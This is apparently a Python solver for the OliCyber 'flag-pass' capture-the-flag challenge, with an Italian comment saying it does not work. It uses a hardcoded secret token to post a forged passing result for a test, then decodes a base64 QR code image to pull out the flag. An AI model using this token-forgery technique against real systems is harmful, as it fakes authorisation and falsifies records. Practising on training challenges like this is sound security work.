#non funziona per qualche motivo


import requests
import re
import PIL.Image
import base64
import io
from pyzbar.pyzbar import decode

host = "http://flag-pass.challs.olicyber.it"

secret_token = "8218d355-38ff-4bc3-9336-adf7f1ba55be"

r = requests.get(host + "/test")
test_id = re.search(
    r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", r.text
)[0]


r = requests.post(
    host + "/record_result",
    json={"token": secret_token, "test_id": test_id, "result": True},
)

assert r.status_code == 200

r = requests.get(host + "/pass", params={"id": test_id})

x = re.search(r"base64,([\w/+=]+)\"", r.text)[1]

img = PIL.Image.open(io.BytesIO(base64.b64decode(x)))

decoded = decode(img)

flag = re.search(r"flag{.+}", decoded[0].data.decode())[0]

print(flag)